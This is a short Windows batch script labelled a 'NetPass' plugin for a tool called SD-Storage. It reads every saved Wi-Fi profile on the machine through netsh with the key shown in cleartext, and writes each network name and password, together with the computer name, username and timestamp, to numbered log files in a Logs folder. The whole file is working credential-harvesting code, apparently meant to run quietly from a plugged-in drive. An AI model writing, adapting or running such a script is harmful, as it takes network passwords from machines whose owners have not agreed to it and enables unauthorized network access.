@echo off
pushd %AppFolder%
if exist "DisableNetPass.ini" exit 999
:: NetPass Plugin By SD-Storage
if not exist "Logs\" md Logs >nul 2>&1
call :GetNewLogFile
(
echo PC Name  ^| %computerName%
echo Username ^| %UserName%
echo Time     ^| %time% ^| Date ^| %date%
echo.
)> "%LogFile%"
call :NetworkPasswords>> "%LogFile%"
exit

:GetNewLogFile
set Number=1
:loop
if exist "Logs\#%Number%_Log.log" set /a Number=%number%+1 >nul&goto :Loop
set "LogFile=Logs\#%Number%_Log.log"
goto :EOF
:NetworkPasswords
for /f "skip=9 delims=" %%A in ('netsh wlan show profile') do (set "NetworkName=%%A"&call :Log)
goto :EOF
:Log
del TmpPassFile.tmp >nul 2>&1&set "NetworkPassword=NONE"
set "NetworkName=%NetworkName:~27%"
set "NetworkName=%NetworkName:&=^&%"
set "NetworkName=%NetworkName:|=^|%"
echo SSID Name ^| %NetworkName%
netsh wlan show profile name="%NetworkName%" key=clear|findstr /I /B /C:"    Key Content"> %temp%\TmpPassFile.tmp&set /p NetworkPassword=<%temp%\TmpPassFile.tmp
if not "%NetworkPassword%" == "NONE" (set "NetworkPassword=%NetworkPassword:~29%")
set "NetworkPassword=%NetworkPassword:&=^&%"
set "NetworkPassword=%NetworkPassword:|=^|%"
echo Password  ^| %NetworkPassword%
echo.
goto :EOF